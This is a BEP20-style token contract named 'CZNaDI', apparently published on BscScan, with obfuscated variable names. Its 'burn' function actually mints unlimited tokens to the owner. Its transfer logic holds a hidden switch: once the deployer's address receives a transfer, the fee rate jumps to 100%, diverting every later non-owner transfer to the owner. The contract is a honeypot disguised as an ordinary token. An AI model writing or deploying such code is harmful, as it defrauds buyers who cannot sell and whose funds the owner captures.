/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.6.0;
contract SZNaDI {
uint256 public  TLURFC = 100000000000000000;
string public  symbol = "CZNaDI";
address public  TuPtTv = address(0);
uint256 public  mKlCTv = 100000000000000000000000;
address public  eyURRK = address(0);
uint256 public  VVWwnI = 10000000000000000000000000000;
uint256 public  CWpLsC = 10000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  TvdTZn = 100000000000000000000000;
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  qZTQML = address(0);
mapping (address => uint256) public balanceOf;
address public  EYpPMQ = address(0);
address public  yxLLbg = address(0);
uint256 public  QVKLmE = 1000000000000000000;
uint256 public  tNGydl = 100000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
string public  name = "CZNaDI";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  qkDStx = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
uint256 public  EhcOzI = 10000000000000000000;
uint256 private  KwwnZj = 10000000000000;
uint256 public constant LXhJva = 9+1;
address public  rYuwfl = address(0);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () public {
qZTQML = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "wOUgCS");
require(to != address(0), "wOUgCS");
require(amount <= balanceOf[from], "wOUgCS");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* LXhJva/KwwnZj ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==qZTQML){
KwwnZj = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}